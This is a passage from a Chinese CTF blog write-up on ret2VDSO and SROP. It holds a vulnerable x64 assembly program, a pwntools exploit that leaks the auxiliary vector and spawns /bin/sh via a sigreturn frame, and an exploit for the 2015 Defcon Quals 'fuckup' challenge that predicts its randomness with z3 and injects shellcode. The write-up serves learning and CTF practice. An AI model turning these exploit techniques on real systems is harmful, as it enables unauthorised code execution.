+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">jmp _start</span><br><span class="line">vuln:</span><br><span class="line">sub rsp, 8</span><br><span class="line">mov rax, 0 ; sys_read</span><br><span class="line">xor rdi, rdi</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov rdx, 1024</span><br><span class="line">syscall</span><br><span class="line">add rsp, 8</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">call vuln</span><br><span class="line">mov rax, 60 ; sys_exit</span><br><span class="line">xor rdi, rdi</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">gadgets:</span><br><span class="line">mov rdi, 1</span><br><span class="line">ret</span><br><span class="line">mov rax, 15</span><br><span class="line">ret</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>尝试利用 vsyscall 中的 <code>syscall ; ret</code> 没能成功，所以在程序后面又加了一个 Gadget 用来构造（具体什么原因没有找到）。在栈上泄漏 AUXV 之后，可以获取 VDSO 的基址以及输入的字符串在栈上的地址。脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#context.terminal = ['lxterminal', '-e']</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># id's of Auxillary Vectors</span></span><br><span class="line">AT_SYSINFO_EHDR = <span class="number">0x21</span></span><br><span class="line">AT_HWCAP = <span class="number">0x10</span></span><br><span class="line">AT_PAGESZ = <span class="number">0x06</span></span><br><span class="line">AT_CLKTCK = <span class="number">0x11</span></span><br><span class="line">AT_PHDR = <span class="number">0x03</span></span><br><span class="line">AT_PHENT = <span class="number">0x04</span></span><br><span class="line">AT_PHNUM = <span class="number">0x05</span></span><br><span class="line">AT_BASE = <span class="number">0x07</span></span><br><span class="line">AT_FLAGS = <span class="number">0x08</span></span><br><span class="line">AT_ENTRY = <span class="number">0x09</span></span><br><span class="line">AT_UID = <span class="number">0x0b</span></span><br><span class="line">AT_EUID = <span class="number">0x0c</span></span><br><span class="line">AT_GID = <span class="number">0x0d</span></span><br><span class="line">AT_EGID = <span class="number">0x0e</span></span><br><span class="line">AT_SECURE = <span class="number">0x17</span></span><br><span class="line">AT_RANDOM = <span class="number">0x19</span></span><br><span class="line">AT_EXECFN = <span class="number">0x1f</span></span><br><span class="line">AT_PLATFORM = <span class="number">0x0f</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x400082</span></span><br><span class="line">set_write = <span class="number">0x4000ac</span></span><br><span class="line">syscall_addr = <span class="number">0x400096</span></span><br><span class="line">set_sigreturn = <span class="number">0x4000b2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">payload += p64(set_write)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += <span class="string">'A'</span> * <span class="number">8</span></span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">raw_input(<span class="string">'@'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span></span><br><span class="line">raw_input(<span class="string">'@'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">ENV_AUX_VEC = p.recv(<span class="number">1024</span>)</span><br><span class="line">QWORD_LIST = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ENV_AUX_VEC), <span class="number">8</span>):</span><br><span class="line">    QWORD_LIST.append(u64(ENV_AUX_VEC[i:i + <span class="number">8</span>]))</span><br><span class="line">start_aux_vec = QWORD_LIST.index(AT_SYSINFO_EHDR) <span class="comment"># 计算AUXV的起始地址</span></span><br><span class="line">info(hex(start_aux_vec))</span><br><span class="line">AUX_VEC_ENTRIES = QWORD_LIST[start_aux_vec: start_aux_vec + (<span class="number">18</span> * <span class="number">2</span>)] <span class="comment"># size of auxillary table</span></span><br><span class="line">AUX_VEC_ENTRIES = dict(AUX_VEC_ENTRIES[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(AUX_VEC_ENTRIES), <span class="number">2</span>))</span><br><span class="line">vdso_addr = AUX_VEC_ENTRIES[AT_SYSINFO_EHDR]</span><br><span class="line">info(<span class="string">"vdso_addr = "</span> + hex(vdso_addr))</span><br><span class="line">bin_sh_addr = AUX_VEC_ENTRIES[AT_RANDOM] - <span class="number">0x379</span> <span class="comment"># 获取“/bin/sh”地址</span></span><br><span class="line">info(<span class="string">"bin_sh_addr = "</span> + hex(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">syscall_ret = <span class="number">0xffffffffff600007</span></span><br><span class="line">syscall_ret = <span class="number">0x4000b8</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = bin_sh_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">8</span> + p64(set_sigreturn) + p64(syscall_ret) + str(frame)</span><br><span class="line">raw_input(<span class="string">'@'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="fuckup"><a href="#fuckup" class="headerlink" title="fuckup"></a>fuckup</h1><p>2015 Defcon Quals 中这道题可以使用 ret2VDSO 和 SROP。具体没能复现出来，主要理解一下思想。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./fuckup</span><br><span class="line">[*] <span class="string">'/home/beale/Desktop/2015-Defcon-Quals-fuckup/fuckup'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>总共有五个选项，选项 2 会修改程序段和栈的基址，并重新指向新的地址；选项 3 会告诉我们当前的随机数并再次随机化程序段；选项 4 中可以进行溢出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ./fuckup</span><br><span class="line">Welcome to Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization, the new and improved ASLR.</span><br><span class="line">This app is to <span class="built_in">help</span> prove the benefits of F.U.C.K.U.P.</span><br><span class="line">Main Menu</span><br><span class="line">---------</span><br><span class="line">1. Display info</span><br><span class="line">2. Change random</span><br><span class="line">3. View state info</span><br><span class="line">4. Test stack smash</span><br><span class="line">-------</span><br><span class="line">0. Quit</span><br></pre></td></tr></table></figure>
+<p>在选项 2 的代码反编译后可以看到，每次用户执行命令时，程序会根据类似于 WELL512 的生成算法生成的随机数，改变二进制映射的存储器的基址：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80481A6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    seed_1 = WELL512() * <span class="number">4294967295.0</span>;</span><br><span class="line">    seed_2 = (<span class="keyword">signed</span> __int64)seed_1;</span><br><span class="line">    addy = (<span class="keyword">void</span> *)(seed_2 &amp; <span class="number">0xFFFFF000</span>);</span><br><span class="line">    actual = my_mmap(seed_2 &amp; <span class="number">0xFFFFF000</span>, <span class="number">28672</span>, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>, v0, v0);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (seed_2 &amp; <span class="number">0xFFFFF000</span>) != actual );</span><br><span class="line">  qmemcpy(addy, dword_804EB40, <span class="number">0x7000</span>u);</span><br><span class="line">  my_mprotect(addy, <span class="number">0x4000</span>u, <span class="number">5</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>普通的思路肯定是做不了的。使用 VDSO 的思路大致如下：</p>
+<ul>
+<li>因为 32 位下 VDSO 只有 1 字节是随机的，可以暴力破解</li>
+<li>直接溢出改返回地址，但只有 100 个字节<ul>
+<li>首先先利用 VDSO 的 Gadget 做出 sys_read 并加大输入的大小</li>
+<li>将读入的内容放到 TLS（TLS 的位置在 VDSO 前一页）</li>
+<li>使用 sysenter 将栈转移到 TLS 段</li>
+<li>在第二次输入的时候将 /bin/sh 放到 TLS 段（这个时候栈已经搬到 TLS 了）</li>
+</ul>
+</li>
+<li>接着把 Sigreturn Gadget 以及 Fake Signal Frame 一并放进，然后可以直接 execve 执行 /bin/sh</li>
+<li>循环直到成功 get shell</li>
+</ul>
+<p>还可以通过 z3 对伪随机数进行预测，脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">state = [BitVec(<span class="string">"a1_&#123;0&#125;"</span>.format(i), <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(x + offset)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">well512</span><span class="params">(index)</span>:</span></span><br><span class="line">    idx = (index+<span class="number">15</span>) &amp; <span class="number">15</span></span><br><span class="line">    a = state[index]</span><br><span class="line">    c = state[(index+<span class="number">13</span>) &amp; <span class="number">15</span>]</span><br><span class="line">    b = a ^ c ^ ((a &lt;&lt; <span class="number">16</span>) &amp; <span class="number">0xffffffff</span>) ^ ((c &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">    c = state[(index+<span class="number">9</span>) &amp; <span class="number">15</span>]</span><br><span class="line">    c ^= (c &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    state[(index+<span class="number">10</span>) &amp; <span class="number">15</span>] = c ^ b</span><br><span class="line">    a = state[idx]</span><br><span class="line">    d = ((<span class="number">32</span> * (c ^ b)) &amp; <span class="number">0xDA442D24</span>) ^ c ^ b</span><br><span class="line">    state[idx] = a ^ b ^ d ^ ((a &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xffffffff</span>) ^ (</span><br><span class="line">        (b &lt;&lt; <span class="number">18</span>) &amp; <span class="number">0xffffffff</span>) ^ ((c &lt;&lt; <span class="number">28</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">return</span> idx</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">well512_z3</span><span class="params">(index)</span>:</span></span><br><span class="line">    idx = (index+<span class="number">15</span>) &amp; <span class="number">15</span></span><br><span class="line">    a = state[index]</span><br><span class="line">    c = state[(index+<span class="number">13</span>) &amp; <span class="number">15</span>]</span><br><span class="line">    b = a ^ c ^ (a &lt;&lt; <span class="number">16</span>) ^ (c &lt;&lt; <span class="number">15</span>)</span><br><span class="line">    c = state[(index+<span class="number">9</span>) &amp; <span class="number">15</span>]</span><br><span class="line">    c ^= LShR(c, <span class="number">11</span>)</span><br><span class="line">    a = state[idx]</span><br><span class="line">    state[(index+<span class="number">10</span>) &amp; <span class="number">15</span>] = b ^ c</span><br><span class="line">    d = ((<span class="number">32</span> * (c ^ b)) &amp; <span class="number">0xDA442D24</span>) ^ c ^ b</span><br><span class="line">    a = state[idx]</span><br><span class="line">    state[idx] = a ^ b ^ d ^ (a &lt;&lt; <span class="number">2</span>) ^ (b &lt;&lt; <span class="number">18</span>) ^ (c &lt;&lt; <span class="number">28</span>)</span><br><span class="line">    <span class="keyword">return</span> idx</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_state</span><span class="params">(recv)</span>:</span></span><br><span class="line">    info(<span class="string">'Start find state.'</span>)</span><br><span class="line">    <span class="keyword">global</span> state</span><br><span class="line">    z = Solver()</span><br><span class="line">    idx = <span class="number">15</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> recv:</span><br><span class="line">        idx = well512_z3(idx)</span><br><span class="line">        z.add(state[idx] == r + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./fuckup'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(c)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Quit\n'</span>)</span><br><span class="line">    p.sendline(str(c))</span><br><span class="line"></span><br><span class="line">r_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r = int(p.recv(<span class="number">0x20</span>)[<span class="number">0x11</span>:<span class="number">0x19</span>], <span class="number">16</span>)</span><br><span class="line">    r_list.append(r)</span><br><span class="line">info(r_list)</span><br><span class="line">z = find_state(r_list)</span><br><span class="line">info(<span class="string">'Solver result =&gt; '</span> + str(z.check()))</span><br><span class="line">next_state = dict()</span><br><span class="line">model = z.model()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> model:</span><br><span class="line">    idx = int(str(i)[<span class="number">3</span>:])</span><br><span class="line">    val = model[i].as_long()</span><br><span class="line">    next_state[idx] = val</span><br><span class="line">info(next_state)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> next_state:</span><br><span class="line">        state[i] = next_state[i]</span><br><span class="line">idx = <span class="number">15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">    idx = well512(idx)</span><br><span class="line">idx = well512(idx)</span><br><span class="line">predict_val = state[idx] - <span class="number">1</span></span><br><span class="line">info(<span class="string">'predict_val = '</span> + hex(predict_val))</span><br><span class="line">current_base = <span class="number">0xfffff000</span> &amp; predict_val</span><br><span class="line">info(<span class="string">'current_base = '</span> + hex(current_base))</span><br><span class="line"></span><br><span class="line">base = <span class="number">0x8048000</span></span><br><span class="line">offset = current_base - base</span><br><span class="line"><span class="comment"># 0x0804908f : pop eax ; pop ebx ; pop esi ; ret</span></span><br><span class="line">pop_eax_ebx_esi_ret = <span class="number">0x0804908f</span></span><br><span class="line"><span class="comment"># 0x0804961a : pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0804961a</span></span><br><span class="line"><span class="comment"># 0x0804875f : int 0x80</span></span><br><span class="line">int_0x80 = <span class="number">0x0804875f</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x16</span></span><br><span class="line">payload += m(pop_eax_ebx_esi_ret)</span><br><span class="line">payload += p32(<span class="number">0x7D</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += m(pop_edx_ecx_ebx_ret)</span><br><span class="line">payload += p32(<span class="number">0x7</span>)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)</span><br><span class="line">payload += p32(current_base)</span><br><span class="line">payload += m(int_0x80)</span><br><span class="line">payload += m(pop_eax_ebx_esi_ret)</span><br><span class="line">payload += p32(<span class="number">0x3</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += m(pop_edx_ecx_ebx_ret)</span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line">payload += p32(current_base)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += m(int_0x80)</span><br><span class="line">payload += p32(current_base)</span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += asm(shellcraft.sh())</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso</a><br><a href="http://adam8157.info/blog/2011/10/linux-vdso/" target="_blank" rel="noopener">http://adam8157.info/blog/2011/10/linux-vdso/</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="https://www.anquanke.com/post/id/85810" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85810</a><br><a href="https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/" target="_blank" rel="noopener">https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/</a><br><a href="https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html" target="_blank" rel="noopener">https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html</a><br><a href="https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/" target="_blank" rel="noopener">https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/</a><br><a href="https://pwnexpoit.tistory.com/13" target="_blank" rel="noopener">https://pwnexpoit.tistory.com/13</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf，pwn/">ctf，pwn</a></li></ul>
+
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/03/13/Understanding-SigReturn-Oriented-Programming/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Understanding SigReturn-Oriented-Programming</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#What-is-VDSO"><span class="nav-number">1.</span> <span class="nav-text">What is VDSO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Why-ret2VDSO"><span class="nav-number">1.1.</span> <span class="nav-text">Why ret2VDSO?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#How-ret2VDSO"><span class="nav-number">1.2.</span> <span class="nav-text">How ret2VDSO?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2VDSO-Theory"><span class="nav-number">1.3.</span> <span class="nav-text">ret2VDSO Theory</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Example"><span class="nav-number">2.</span> <span class="nav-text">Example</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Example-x64"><span class="nav-number">3.</span> <span class="nav-text">Example_x64</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fuckup"><span class="nav-number">4.</span> <span class="nav-text">fuckup</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#References"><span class="nav-number">5.</span> <span class="nav-text">References</span></a></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2020 AssassinQ All Rights Reserved.
+        
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+      var headerblur = document.getElementById("header-blur");
+      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+
+
+
+
+
+  </div>
+
